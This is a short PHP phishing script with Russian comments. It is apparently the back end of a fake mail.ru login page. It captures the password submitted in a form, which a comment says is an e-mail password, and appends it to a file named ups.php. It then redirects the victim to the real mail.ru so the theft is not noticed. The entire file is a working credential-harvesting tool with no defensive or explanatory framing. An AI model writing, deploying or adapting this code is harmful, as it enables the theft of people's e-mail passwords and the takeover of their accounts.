<?PHP

$Pass = $_POST['Password'];//Пароль от E-mail'a
$c = "$Pass";
$fp = fopen("ups.php","a+"); //открыть файл
fwrite($fp,"\n $c <br> \n");//записываем все данные
fclose($fp); //закрываем
header("Location: http://mail.ru"); //куда перенавравиться пользователь после ввода данных
echo "<META HTTP-EQUIV=\"Refresh\" content =\"0; URL=http://mail.ru\">"
?>